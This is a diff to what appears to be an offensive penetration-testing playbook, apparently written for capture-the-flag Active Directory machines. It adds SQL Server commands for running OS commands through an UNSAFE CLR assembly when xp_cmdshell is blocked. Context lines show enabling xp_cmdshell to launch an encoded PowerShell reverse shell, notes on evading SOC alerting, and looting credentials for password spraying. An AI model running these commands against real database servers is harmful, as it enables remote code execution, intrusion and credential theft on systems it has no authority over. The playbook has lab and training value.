@@ -31,6 +31,15 @@ SQL> EXEC ('sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoa
 ```
 Enable exec on the instance you control: `enable_xp_cmdshell` then `xp_cmdshell "powershell -e <b64 revshell>"` (SOC-loud; catch on a listener). `mssql_priv` (nxc `-M mssql_priv`) auto-checks impersonation + xp_cmdshell. Record the shell host + service account.
 
+**`xp_cmdshell` disabled/monitored → CLR custom-assembly RCE.** The standard fallback when `xp_cmdshell` is blocked, alerted on, or re-disabled after each use: load a .NET assembly as a SQL CLR stored procedure and call it instead.
+```
+SQL> ALTER DATABASE [master] SET TRUSTWORTHY ON
+SQL> CREATE ASSEMBLY custom_assembly FROM 0x<hex-of-compiled-.NET-dll> WITH PERMISSION_SET = UNSAFE
+SQL> CREATE PROCEDURE [dbo].[cmd_exec] @cmd NVARCHAR(4000) AS EXTERNAL NAME [custom_assembly].[StoredProcedures].[cmd_exec]
+SQL> EXEC dbo.cmd_exec 'whoami'
+```
+PowerUpSQL (`Get-SQLServerLinkCrawl`, `Invoke-SQLOSCmdCLR`) automates enumeration + assembly build + load in one pass — prefer it over hand-building the DLL. Same detection profile as `xp_cmdshell` (EXTERNAL_ACCESS/UNSAFE assemblies are a standard SOC alert) — treat as equally SOC-loud, record the same way.
+
 ## §1a Loot creds on the foothold → reuse-spray (the pivot multiplier)
 
 A shell or a readable share is a credential source before it is anything else. AD boxes chain by finding one account's secret in a file and reusing it to become a *different*, higher-value account (EscapeTwo: `sa` password in a share → MSSQL RCE → `sql-Configuration.INI` yields a service password → spray → lands `ryan`).
